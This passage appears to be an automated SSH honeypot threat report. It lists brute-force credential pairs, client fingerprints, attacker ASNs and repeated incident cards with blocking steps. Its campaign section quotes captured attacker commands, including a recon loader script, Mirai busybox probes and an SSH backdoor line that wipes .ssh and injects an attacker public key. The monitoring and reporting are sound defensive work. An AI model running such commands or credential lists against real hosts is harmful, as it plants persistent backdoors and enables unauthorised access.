| `selvananthi` | `runner` | `91.92.47.128` | 2026-07-13T06:51:24 |
| `root` | `mnbcxz` | `10.0.0.73` | 2026-07-13T06:51:25 |
| `user395` | `qwerty` | `91.92.47.128` | 2026-07-13T06:51:30 |
| `us56` | `ts` | `91.92.47.128` | 2026-07-13T06:51:36 |
| `us14` | `null` | `91.92.47.128` | 2026-07-13T06:51:42 |
| `dbadmin` | `nutanix/4u` | `91.92.47.128` | 2026-07-13T06:51:49 |
| `daemons_jelx_usr` | `changemeNOW` | `91.92.47.128` | 2026-07-13T06:51:56 |
| `shreyas` | `1qaz@WSX` | `91.92.47.128` | 2026-07-13T06:52:03 |
| `root` | `3333333` | `10.0.0.73` | 2026-07-13T06:52:09 |
| `sadmin` | `test!@` | `91.92.47.128` | 2026-07-13T06:52:10 |
| `vastai_kaalia` | `flask` | `91.92.47.128` | 2026-07-13T06:52:16 |
| `zhangjilei` | `grid` | `91.92.47.128` | 2026-07-13T06:52:23 |
| `daonkt` | `102030` | `91.92.47.128` | 2026-07-13T06:52:29 |
| `ndbadm` | `mc` | `91.92.47.128` | 2026-07-13T06:52:35 |
| `chenxue` | `root1` | `91.92.47.128` | 2026-07-13T06:52:44 |
| `kamgareyman` | `1234qwer` | `91.92.47.128` | 2026-07-13T06:52:52 |
| `seilccadmin` | `12345678` | `91.92.47.128` | 2026-07-13T06:53:03 |
| `s10philomina` | `123@@@` | `91.92.47.128` | 2026-07-13T06:53:11 |
| `SJ14` | `!Q@W3e4r` | `91.92.47.128` | 2026-07-13T06:53:19 |
| `s10olamide` | `master` | `91.92.47.128` | 2026-07-13T06:53:27 |
| `root` | `Password123` | `36.137.38.119` | 2026-07-13T06:53:29 |
| `Tnmadmin` | `deploy@123` | `91.92.47.128` | 2026-07-13T06:53:36 |
| `root` | `Password123` | `186.215.107.189` | 2026-07-13T06:53:39 |
| `pgbouncer` | `mohammad` | `91.92.47.128` | 2026-07-13T06:53:43 |
| `viktor` | `123123` | `91.92.47.128` | 2026-07-13T06:53:51 |
| `diana.castro` | `bigdata` | `91.92.47.128` | 2026-07-13T06:53:59 |
| `s10emmanuel` | `elasticsearch` | `91.92.47.128` | 2026-07-13T06:54:08 |
| `s10carol` | `1qazXSW@` | `91.92.47.128` | 2026-07-13T06:54:16 |
| `hamed2` | `Root@123` | `91.92.47.128` | 2026-07-13T06:54:23 |
| `fbl` | `1q2w3e4r` | `91.92.47.128` | 2026-07-13T06:54:31 |
| `cdickens` | `david` | `91.92.47.128` | 2026-07-13T06:54:40 |
| `cloud-user` | `rootroot` | `91.92.47.128` | 2026-07-13T06:54:48 |
| `pey8` | `deploy` | `91.92.47.128` | 2026-07-13T06:54:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **670** |
| Sessions with Fingerprint | **20** |
| Unique HASSH Fingerprints | **20** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 221 |
| libssh | 62 |
| OpenSSH | 58 |
| Paramiko (Python) | 16 |
| Nmap scanner | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 151 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 57 | 55 |
| `2ec37a7cc8da...` | Mirai/variant | 41 | 3 |
| `f555226df196...` | Mirai/variant | 27 | 9 |
| `a2de0f306611...` | Mirai/variant | 16 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 151 | 2 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 57 | 55 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 41 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 27 | 5 | — |
| `f555226df196...` | libssh | 27 | 9 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 16 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 15 | 2 | Generic scanner |
| `e788c657d1a2...` | Nmap scanner | 12 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 38 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`, `91.92.40.240`, `91.92.40.13`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.10`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.33.174`, `103.97.101.25`, `102.210.149.236`, `165.154.40.97`, `101.47.155.9`, `172.96.182.111`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **145** |
| Unique ASNs | **80** |
| High-Risk ASNs | **72** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS23969` | TOT Public Company Limited | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4766` | Korea Telecom | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (396)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ac8a35eed4db

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:06` | `cowrie.session.connect` |
| `2026-07-13 02:55:06` | `cowrie.login.success` |
| `2026-07-13 02:55:07` | `cowrie.session.params` |
| `2026-07-13 02:55:07` | `cowrie.log.closed` |
| `2026-07-13 02:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7930fcdc3971

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:07` | `cowrie.session.connect` |
| `2026-07-13 02:55:07` | `cowrie.login.success` |
| `2026-07-13 02:55:08` | `cowrie.session.params` |
| `2026-07-13 02:55:08` | `cowrie.log.closed` |
| `2026-07-13 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbbc259be1c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:08` | `cowrie.session.connect` |
| `2026-07-13 02:55:08` | `cowrie.login.success` |
| `2026-07-13 02:55:08` | `cowrie.session.params` |
| `2026-07-13 02:55:08` | `cowrie.log.closed` |
| `2026-07-13 02:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58592c538084

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:09` | `cowrie.session.connect` |
| `2026-07-13 02:55:09` | `cowrie.login.success` |
| `2026-07-13 02:55:09` | `cowrie.session.params` |
| `2026-07-13 02:55:09` | `cowrie.log.closed` |
| `2026-07-13 02:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf916c61587

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:09` | `cowrie.session.connect` |
| `2026-07-13 02:55:10` | `cowrie.login.success` |
| `2026-07-13 02:55:10` | `cowrie.session.params` |
| `2026-07-13 02:55:10` | `cowrie.log.closed` |
| `2026-07-13 02:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64128656d959

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:10` | `cowrie.session.connect` |
| `2026-07-13 02:55:10` | `cowrie.login.success` |
| `2026-07-13 02:55:11` | `cowrie.session.params` |
| `2026-07-13 02:55:11` | `cowrie.log.closed` |
| `2026-07-13 02:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b18cc19fbd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:11` | `cowrie.session.connect` |
| `2026-07-13 02:55:11` | `cowrie.login.success` |
| `2026-07-13 02:55:12` | `cowrie.session.params` |
| `2026-07-13 02:55:12` | `cowrie.log.closed` |
| `2026-07-13 02:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-315fa3b2e152

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:12` | `cowrie.session.connect` |
| `2026-07-13 02:55:12` | `cowrie.login.success` |
| `2026-07-13 02:55:13` | `cowrie.session.params` |
| `2026-07-13 02:55:13` | `cowrie.log.closed` |
| `2026-07-13 02:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b017d56d817

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:13` | `cowrie.session.connect` |
| `2026-07-13 02:55:13` | `cowrie.login.success` |
| `2026-07-13 02:55:13` | `cowrie.session.params` |
| `2026-07-13 02:55:13` | `cowrie.log.closed` |
| `2026-07-13 02:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8260dc49ab4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:13` | `cowrie.session.connect` |
| `2026-07-13 02:55:14` | `cowrie.login.success` |
| `2026-07-13 02:55:14` | `cowrie.session.params` |
| `2026-07-13 02:55:20` | `cowrie.log.closed` |
| `2026-07-13 02:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7dc5864fd7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:20` | `cowrie.session.connect` |
| `2026-07-13 02:55:20` | `cowrie.login.success` |
| `2026-07-13 02:55:21` | `cowrie.session.params` |
| `2026-07-13 02:55:21` | `cowrie.log.closed` |
| `2026-07-13 02:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b76997b39d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:21` | `cowrie.session.connect` |
| `2026-07-13 02:55:21` | `cowrie.login.success` |
| `2026-07-13 02:55:22` | `cowrie.session.params` |
| `2026-07-13 02:55:22` | `cowrie.log.closed` |
| `2026-07-13 02:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79bf22d5599

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:22` | `cowrie.session.connect` |
| `2026-07-13 02:55:22` | `cowrie.login.success` |
| `2026-07-13 02:55:23` | `cowrie.session.params` |
| `2026-07-13 02:55:23` | `cowrie.log.closed` |
| `2026-07-13 02:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6250ad6cf055

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:23` | `cowrie.session.connect` |
| `2026-07-13 02:55:23` | `cowrie.login.success` |
| `2026-07-13 02:55:23` | `cowrie.session.params` |
| `2026-07-13 02:55:23` | `cowrie.log.closed` |
| `2026-07-13 02:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f863f2fbb0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:23` | `cowrie.session.connect` |
| `2026-07-13 02:55:24` | `cowrie.login.success` |
| `2026-07-13 02:55:24` | `cowrie.session.params` |
| `2026-07-13 02:55:24` | `cowrie.log.closed` |
| `2026-07-13 02:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b872739e9bfd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:24` | `cowrie.session.connect` |
| `2026-07-13 02:55:24` | `cowrie.login.success` |
| `2026-07-13 02:55:25` | `cowrie.session.params` |
| `2026-07-13 02:55:25` | `cowrie.log.closed` |
| `2026-07-13 02:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d3fd00407a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:25` | `cowrie.session.connect` |
| `2026-07-13 02:55:25` | `cowrie.login.success` |
| `2026-07-13 02:55:26` | `cowrie.session.params` |
| `2026-07-13 02:55:26` | `cowrie.log.closed` |
| `2026-07-13 02:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9312d4f4574

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:26` | `cowrie.session.connect` |
| `2026-07-13 02:55:26` | `cowrie.login.success` |
| `2026-07-13 02:55:27` | `cowrie.session.params` |
| `2026-07-13 02:55:27` | `cowrie.log.closed` |
| `2026-07-13 02:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819e940c2e72

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:27` | `cowrie.session.connect` |
| `2026-07-13 02:55:27` | `cowrie.login.success` |
| `2026-07-13 02:55:27` | `cowrie.session.params` |
| `2026-07-13 02:55:27` | `cowrie.log.closed` |
| `2026-07-13 02:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f90003e6fc5b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:27` | `cowrie.session.connect` |
| `2026-07-13 02:55:28` | `cowrie.login.success` |
| `2026-07-13 02:55:28` | `cowrie.session.params` |
| `2026-07-13 02:55:28` | `cowrie.log.closed` |
| `2026-07-13 02:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a512aa5fd9b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:28` | `cowrie.session.connect` |
| `2026-07-13 02:55:28` | `cowrie.login.success` |
| `2026-07-13 02:55:29` | `cowrie.session.params` |
| `2026-07-13 02:55:29` | `cowrie.log.closed` |
| `2026-07-13 02:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c4c8bfa655b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:29` | `cowrie.session.connect` |
| `2026-07-13 02:55:29` | `cowrie.login.success` |
| `2026-07-13 02:55:30` | `cowrie.session.params` |
| `2026-07-13 02:55:30` | `cowrie.log.closed` |
| `2026-07-13 02:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bedff058fbea

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:30` | `cowrie.session.connect` |
| `2026-07-13 02:55:30` | `cowrie.login.success` |
| `2026-07-13 02:55:30` | `cowrie.session.params` |
| `2026-07-13 02:55:30` | `cowrie.log.closed` |
| `2026-07-13 02:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6275fc39d6a4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
| **Last Seen** | 2026-07-13 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 02:55:30` | `cowrie.session.connect` |
| `2026-07-13 02:55:31` | `cowrie.login.success` |
| `2026-07-13 02:55:31` | `cowrie.session.params` |
| `2026-07-13 02:55:31` | `cowrie.log.closed` |
| `2026-07-13 02:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed6747ef987

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]14` |
| **First Seen** | 2026-07-13 02:55 |
